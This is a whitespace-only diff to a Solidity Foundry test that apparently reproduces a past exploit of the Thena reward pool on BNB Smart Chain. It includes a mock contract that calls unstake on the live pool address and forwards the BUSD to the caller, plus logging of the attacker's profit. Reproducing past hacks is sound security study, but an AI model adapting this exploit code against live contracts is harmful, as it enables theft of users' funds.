@@ -10,10 +10,13 @@ import "./../interface.sol";
 // https://bscscan.com/tx/0xdf6252854362c3e96fd086d9c3a5397c303d265649aee0b023176bb49cf00d4b
 
 interface IThenaRewardPool {
+
     function unstake(address, uint256, address, bool) external;
+
 }
 
 interface IVolatileV1 {
+
     function metadata()
         external
         view
@@ -45,9 +48,11 @@ interface IVolatileV1 {
     function claimable1(address _user) external view returns (uint256);
 
     function isStable() external view returns (bool);
+
 }
 
 contract ContractTest is Test {
+
     IERC20 THENA = IERC20(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
@@ -78,9 +83,11 @@ contract ContractTest is Test {
             "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
         );
     }
+
 }
 
 contract MockThenaRewardPool {
+
     IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
     IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
 
@@ -92,4 +99,5 @@ contract MockThenaRewardPool {
         pool.unstake(_token, _amount, _pool, _sign);
         BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
     }
+
 }
